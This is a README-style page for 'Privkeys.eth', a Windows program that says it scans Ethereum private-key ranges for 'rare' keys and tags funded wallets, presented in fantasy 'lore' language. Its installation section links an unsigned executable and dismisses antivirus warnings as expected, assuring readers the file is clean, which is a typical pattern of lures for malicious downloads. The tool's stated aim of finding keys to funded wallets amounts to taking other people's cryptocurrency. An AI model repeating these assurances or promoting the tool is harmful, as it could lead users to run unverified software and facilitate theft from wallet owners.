# Privkeys.eth

🔐 A lore-layered entropy scanner built for Windows, tuned to uncover rare Ethereum keys through stylized terminal overlays, modular plugin systems, and collectible output formats.

## 🔍 What It Does

Privkeys.eth is a local-first scanning tool designed to parse entropy patterns across private key ranges. It highlights rare hits, wallet activity, and anomaly spikes through an immersive HUD—complete with plugin toggles, rarity tiers, and session statistics.

- 🧩 Plugin-enabled overlays like `ShardSweeper`
- 💠 Rare key detection with funded wallet tagging
- 📊 Live entropy monitoring and session stats
- 🗃 Local-only—no telemetry, no network requests

## 📦 Installation

Download the latest Windows build:  
[📥 privkeys.exe](./privkeys.exe)

> ⚠️ **Note:** This file is an unsigned Windows executable, and your browser or antivirus may flag it as "potentially unsafe." This is expected behavior for locally compiled binaries.  
> The executable is clean, telemetry-free, and built with transparency in mind. You can sandbox, inspect, or scan it freely.

## 🚧 Roadmap

- 🔁 Plugin architecture v2 with shard chaining
- 🗺 Vault-style documentation release
- 🧪 Entropy event logging with lore triggers
- 🌐 `.torrent` and `.zip` relic packaging

## 🧙 About

Privkeys.eth is part entropy engine, part artifact ritual. Designed for builders who treat keyspace as mythscape—every scan an invocation, every rare hit a shard.
